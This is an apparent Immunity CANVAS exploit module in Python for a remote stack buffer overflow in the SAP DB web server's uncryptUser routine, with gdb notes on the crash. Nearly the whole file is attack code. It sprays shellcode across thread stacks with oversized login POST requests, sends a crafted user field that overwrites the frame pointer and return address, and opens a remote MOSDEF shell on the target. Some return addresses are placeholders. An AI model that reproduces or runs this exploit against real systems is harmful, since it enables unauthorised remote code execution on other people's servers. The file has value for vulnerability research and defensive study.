#! /usr/bin/env python
"""
sapdb.py

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


NAME="SAPDB"
VERSION="1.0"
NOTES2="""
Get it from http://www.sapdb.org/7.4/sap_db_downloads.htm

To Run:
LD_LIBRARY_PATH="/opt/sapdb/web/lib;/opt/sapdb/indep_prog/lib;/opt/sapdb/interfaces/odbc/lib";
export LD_LIBRARY_PATH
cd /opt/sapdb/web/pgm
./wahttp

This bug originally found by someone else, who shall remain nameless. 

"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

from exploitutils import *
sys.path.append('encoder')
import addencoder
import chunkedaddencoder
sys.path.append("shellcode")
import win32shell
sys.path.append("gui")

from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
import linuxshell
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="SAP"
DOCUMENTATION["Date public"]="01/01/9999"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DESCRIPTION="SAPDB Stack Overflow"
VERSION="0.1"
PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Linux", "x86"] ]
GTK2_DIALOG="dialog.glade2"

NOTES=""" 
To debug:
    install DB Server, Version Independant Software, Web Tools, and Call interfaces
    from www.sapdb.org
    Then follow the instructions in their PDF file to LD_LIBRARY_PATH= the right 2 directories
    (/opt/sapdb/web/lib/\;opt/sapdb/interfaces/odbc/lib/)
    then ./wahttp
    break on uncryptUser
    break right before return to see potential crash
    program has signal handler, so you'll want to breakpoint on CrashSignalHandler
    0x40463b0f appears to be the Assign__23Tools_DynamicUTF8StringPCUc that hangs (and then crashes)
    need to find out why
    Program received signal SIGSEGV, Segmentation fault.
    0x404ac971 in Tools_DynamicUTF8StringBuffer::Capacity () from /opt/sapdb/web/lib/websql.so
    1: x/2i $pc
    0x404ac971 <Capacity__C29Tools_DynamicUTF8StringBuffer+9>:      mov    0x4(%eax),%eax
    0x404ac974 <Capacity__C29Tools_DynamicUTF8StringBuffer+12>:     ret
    (gdb) print/x $eax
    $1 = 0xcccccccc
    (gdb) where
    #0  0x404ac971 in Tools_DynamicUTF8StringBuffer::Capacity () from /opt/sapdb/web/lib/websql.so
    #1  0x404aca82 in Tools_DynamicUTF8String::Assign () from /opt/sapdb/web/lib/websql.so
    #2  0x40463b14 in uncryptUser () from /opt/sapdb/web/lib/websql.so
    #3  0xcccccccc in ?? ()
    Cannot access memory at address 0xcccccccc
    (gdb)
    
    
    LD_LIBRARY_PATH="/opt/sapdb/indep_prog/lib;/opt/sapdb/web/lib;/opt/sapdb/interfaces/odbc/lib/";
    export LD_LIBRARY_PATH
    cd /opt/sapdb/web/pgm
    gdb ./wahttp


    
    What's actually happening here is that the process is converting our hex
    numbers into binary (UCS2). But it does this by copying them into a 64 byte
    buffer. So we overwrite stack left and right. There's one continuation of
    execution problem.
    
    Our options, since this is a threaded program, is a return to .text attack, or filling up
    any available threads with our shellcode and jumping blindly into stack space.
    If this was a windows exploit, we could also depend on various shared libraries
    to use for jump targets, but they appear to move around quite a bit.
    
    This is a good opportunity for people to learn how to use info threads
    and thread # to see what's going on.
    
    Don't forget this process handles sigsegv...making it annoying for us. :<

"""

CHANGELOG="""

"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

import urllib

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(9999)
        self.setHost("")
        self.setVersion(0)
        self.badstring="\x00\r\n\t %"
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        return

    def createShellcode(self):
        """Create a standard GO shellcode"""
        self.createLinuxGOShellcode(self.badstring)
        self.shellcode="B"*100+self.shellcode
        self.log("length of real shellcode: %d"%(len(self.shellcode)))
        #self.log("Shellcode: %s"%prettyprint(self.shellcode[:50]))

        return 1

    
    def runTest(self):
        self.log("Running %s test against %s:%d"%(NAME,self.host,self.port))
        try:
            s=self.gettcpsock()
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))        
        except:
            self.log("Couldn't connect to the server")
            return
        
        data=self.getWebServer(s)
        time.sleep(1)
        s.close()
        self.log("Received: %s"%data)
        #we have no way of knowning what archetecture this system is on. But we do get a server version.
        if data=="SAP-Internet-SapDb-Server/1.0":
            self.setVersion(1) #assume linux
            return 1

        return 0

    
    def fillstacks(self):
        """ Fill every thread's stack with our shellcode """

        user="A"
        passwd="C"*5
        attackstring="B"*100000
        for i in range(1,len(attackstring)-6000,5000):
            attackstring=stroverwrite(attackstring,self.shellcode,i)
        attackstring=urllib.quote_plus(attackstring) #needed?
        body=""
        body+="logon=CRYPT&wqServer=server&wqDatabase=database&"
        body+="wqUser=aa%s&wqPassword=%s&SHELL=%s\r\n"%(user,passwd,attackstring)
        
        ret=""
        ret+="POST /websql?logon HTTP/1.1\r\n"
        ret+="Connection: Keep-Alive\r\n"
        ret+="Host: localhost:9999\r\n"
        ret+="Accept-Charset: utf-8,*\r\n"
        ret+="Content-type: application/x-www-form-urlencoded\r\n"
        ret+="Content-length: %d\r\n"%(len(body)) #complete
        ret+="\r\n"
        ret+=body
        
        numberofthreads=20
        for i in range(1,numberofthreads):
            self.log("Sending %d thread data"%i)
            try:
                #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s=self.gettcpsock()
                s.connect((self.host, self.port))
            except:
                self.log("Attack %d reported no open socket - service died?"%i)
                return 0
            self.websend(s,ret)
            canvasengine.socket_save_list.append(s) #save this off so it doens't close
        return 
    
    def run(self):
        #print "Self.version=%d"%self.version
        if self.version==0:
            if self.runTest()==0:
                self.log("Not continuing since test failed to set version")
                return 0
            else:
                self.createShellcode()
        

        if self.fillstacks()==0:
            return 0
        self.log("Done filling all stacks")
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            self.log("Connection attempt reported no open socket - service died?")
            return 0
        sploitstring=self.makesploit()
        self.websend(s,sploitstring)
        sck=s
        verstr=self.versions[self.version][0]
        if verstr.count("Linux"):
            myshellcode=shellcodeGenerator.linux_X86()
            myshellcode.addAttr("setblocking",None)
            myshellcode.addAttr("read_and_exec",{"fdreg": "ebx"})
            sc=myshellcode.get()            

            if linuxshell.doGOhandshake(s,secondstage=sc):
                node=linuxNode()
                node.parentnode=self.socknode
                linuxMosdefShellServer.linuxshellserver(s,node,logfunction=self.logfunction)
                self.log("Calling startup for MOSDEF shell server")
                node.startup()
                self.setInfo("%s attacking %s:%d (Succeeded!)"%(NAME,self.host,self.port))
                return node                       
                    
        #data=self.webrecv(s)
        #self.log("Data=%s"%data)
        return 1
        
    
    def setVersions(self):
        self.versions={}
        #version array: name eip fp readable
        self.versions[1]=("Linux", 0x01020304,0xbffff014L, 0xbffff010L) 
        self.versions[1]=("Linux Jump to Heap", 0x80ef96dL, 0xbffff014L, 0xbffff010L) 
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def makesploit(self):
        self.log("Attacking version %s"%self.versions[self.version][0])

        ret=""
        eip=intel_order(self.versions[self.version][1])
        fp=intel_order(self.versions[self.version][2])
        readable=intel_order(self.versions[self.version][3])

        fp=rawhexstr(fp)
        eip=rawhexstr(eip)
        readable=rawhexstr(readable)
        passwd="0"*5500
        attackstring="B"*4
        user="CCCCCCCC"*32
        user+="01020304"
        user+="05060708"
        user+="AABBCC" #pad
        user+=fp
        user+=eip
        user+=readable
        user+="ABACAABB"

        
        body=""
        body+="logon=CRYPT&wqServer=server&wqDatabase=database&"
        body+="wqUser=aa%s&wqPassword=%s&SHELL=%s\r\n"%(user,passwd,attackstring)
        
        ret+="POST /websql?logon HTTP/1.1\r\n"
        ret+="Connection: Keep-Alive\r\n"
        ret+="Host: localhost:9999\r\n"
        ret+="Accept-Charset: utf-8,*\r\n"
        ret+="Content-type: application/x-www-form-urlencoded\r\n"
        ret+="Content-length: %d\r\n"%len(body)
        ret+="\r\n"
        ret+=body
        
        return ret
        
    def usage(self):
        print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [-p %d]"%(self.port)
        self.displayVersions()

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
        
